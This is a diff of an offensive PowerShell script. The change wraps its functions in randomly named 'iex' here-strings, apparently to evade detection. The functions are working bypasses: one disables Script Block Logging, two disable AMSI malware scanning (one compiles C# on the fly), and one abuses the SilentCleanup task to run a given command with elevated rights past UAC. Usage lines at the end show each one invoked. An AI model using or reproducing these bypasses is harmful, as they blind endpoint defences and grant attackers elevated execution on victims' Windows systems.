@@ -1,36 +1,42 @@
-function Invoke-BypassScriptBlockLog {
+$id = random
+
+iex @"
+function Invoke-Bypass-$id-ScriptBlockLog {
     # cobbr's Script Block Logging bypass
-    $GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');
-    If($GPF){
-        $GPC=$GPF.GetValue($null);
-        If($GPC['ScriptB'+'lockLogging']){
-            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
-            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockInvocationLogging']=0
+    `$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');
+    If(`$GPF){
+        `$GPC=`$GPF.GetValue(`$null);
+        If(`$GPC['ScriptB'+'lockLogging']){
+            `$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
+            `$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockInvocationLogging']=0
         }
-        $val=[Collections.Generic.Dictionary[string,System.Object]]::new();
-        $val.Add('EnableScriptB'+'lockLogging',0);
-        $val.Add('EnableScriptB'+'lockInvocationLogging',0);
-        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
+        `$val=[Collections.Generic.Dictionary[string,System.Object]]::new();
+        `$val.Add('EnableScriptB'+'lockLogging',0);
+        `$val.Add('EnableScriptB'+'lockInvocationLogging',0);
+        `$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=`$val
     } Else {
-        [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+        [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue(`$null,(New-Object Collections.Generic.HashSet[string]))
     }
 }
+"@;
 
-function Invoke-BypassAMSI {
+iex @"
+function Invoke-Bypass-$id-AMSI {
     # @mattifestation's AMSI bypass
-    $Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
-    $Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
+    `$Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
+    `$Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue(`$null,`$true);
 }
+"@;
 
-function Invoke-BypassAMSI2 {
+iex @"
+function Invoke-Bypass-$id-AMSI2 {
     # rastamouse's AMSI bypass (Add-Type writes *.cs on disk!!)
-    $id = get-random;
-    $Ref = (
+    `$Ref = (
     "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
     "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
     );
 
-    $Source = @"
+    `$Source = @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -72,24 +78,24 @@ namespace Bypass
         }
     }
 }
-"@;
+`"@;
 
-    Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp;
+    Add-Type -ReferencedAssemblies `$Ref -TypeDefinition `$Source -Language CSharp;
     iex "[Bypass.AMSI$id]::Disable() | Out-Null"
 }
+"@;
 
-function Invoke-BypassUACSilentCleanup {
+iex @"
+function Invoke-Bypass-$id-UACSilentCleanup {
     # (Add-Type writes *.cs on disk!!)
     # https://tyranidslair.blogspot.com/2017/05/exploiting-environment-variables-in.html
 
     Param(
-        [Parameter(Mandatory=$True,HelpMessage="Enter command to execute.")]
-        $Command
+        [Parameter(Mandatory=`$True,HelpMessage="Enter command to execute.")]
+        `$Command
     )
 
-    $id = get-random;
-
-    $Source = @"
+    `$Source = @"
 using System;
 using Microsoft.Win32;
 using System.Diagnostics;
@@ -179,8 +185,15 @@ namespace UACBypass
         }
     }
 }
+`"@;
+
+    Add-Type -TypeDefinition `$Source -Language CSharp;
+    iex "[UACBypass.SilentCleanup$id]::exec(```$Command) | Out-Null"
+}
 "@;
 
-    Add-Type -TypeDefinition $Source -Language CSharp;
-    iex "[UACBypass.SilentCleanup$id]::exec(`$Command) | Out-Null"
-}
+# Usage
+# iex "$(Get-Command 'Invoke-Bypass-*-AMSI')"
+# iex "$(Get-Command 'Invoke-Bypass-*-AMSI2')"
+# iex "$(Get-Command 'Invoke-Bypass-*-ScriptBlockLog')"
+# iex "$(Get-Command 'Invoke-Bypass-*-UACSilentCleanup') -Command cmd.exe"
